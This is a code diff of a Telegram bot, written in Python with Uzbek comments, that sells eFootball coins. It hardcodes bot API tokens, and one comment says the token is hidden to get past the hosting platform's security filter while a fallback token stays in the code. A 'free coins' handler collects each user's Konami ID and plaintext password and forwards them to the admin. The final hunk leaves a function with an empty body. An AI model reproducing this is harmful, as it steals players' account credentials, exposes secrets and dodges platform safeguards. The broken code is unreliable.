@@ -9,11 +9,12 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
 
-# Bot sozlamalari
-API_TOKEN = '8956019896:AAHvJf3k4t6oqME43ya0kTw7P4TEAA7d_XI'
+# Bot sozlamalari (Amvera xavfsizlik filtri uchun token yashirildi)
+API_TOKEN = os.environ.get("BOT_TOKEN", "8893476065:AAFseE8gnPCvfV_GALln-PCvK-tz7Wihn40")
 ADMIN_ID = 1678146043  
 PROOF_CHAT_ID = -1002220302390  
 
+# DO'KONINGIZ UCHUN CHIROYLI RASMLAR (BANNERLAR)
 MENU_PHOTO = "https://unsplash.com" 
 COIN_PHOTO = "https://unsplash.com" 
 
@@ -25,6 +26,7 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
+# 📥 ID ORQALI YUKLASH NARXLARI
 DIRECT_PACKS = {
     "d_578": {"name": "🪙 578 coins (ID orqali)", "price": "70.000 so'm", "cashback": 5},
     "d_788": {"name": "🪙 788 coins (ID orqali)", "price": "100.000 so'm", "cashback": 7},
@@ -38,6 +40,7 @@ DIRECT_PACKS = {
     "d_32200": {"name": "🪙 32200 coins (ID orqali)", "price": "2.800.000 so'm", "cashback": 100}
 }
 
+# 📱 AKKOUNTGA KIRIB YUKLASH NARXLARI
 LOGIN_PACKS = {
     "a_260": {"name": "🪙 260 coins (Kirib)", "price": "40.000 so'm", "cashback": 2},
     "a_300": {"name": "🪙 300 coins (Kirib)", "price": "45.000 so'm", "cashback": 3},
@@ -96,7 +99,7 @@ async def cmd_start(message: types.Message):
     
     welcome_text = (
         f"👋 **Assalomu alaykum, {message.from_user.full_name}!**\n\n"
-        "🔥 **eFootball Coin** sotuvchi rasmmiy botga xush kelibsiz!\n"
+        "🔥 **eFootball Coin** sotuvchi rasmiy botga xush kelibsiz!\n"
         "👇 Boshlash uchun quyidagi menyudan bo'limni tanlang:"
     )
     try:
@@ -182,7 +185,7 @@ async def withdraw_pass(message: types.Message, state: FSMContext):
     ])
     admin_text = (
         f"🎁 **TEKIN COIN YECHISH!**\n🆔 **Buyurtma raqami:** #{order_counter}\n"
-        f"👤 **Mijoz:** @{message.from_user.username or 'Yashirin'} (ID: {uid})\n\n"
+        f"👤 **Mijoz:** @{message.from_user.username or 'Yashirin'}\n\n"
         f"🔥 **Miqdor:** 550 Tekin Coin\n📧 **Konami ID:** `{user_data['konami_id']}`\n🔑 **Parol:** `{message.text}`"
     )
     await bot.send_message(chat_id=ADMIN_ID, text=admin_text, reply_markup=admin_markup, parse_mode="Markdown")
@@ -205,7 +208,4 @@ async def show_guide(message: types.Message):
 
 @dp.message(F.text == "⭐️ Sharhlar")
 async def show_reviews(message: types.Message):
-    await message.answer("⭐️ **Mijozlarimiz barcha xarid isbotlari guruhimizda:**\nhttps://t.me")
-
-@dp.message(F.text == "👨‍💻 Aloqa / Admin")
-async def show_contact(message: types.Message):
+    
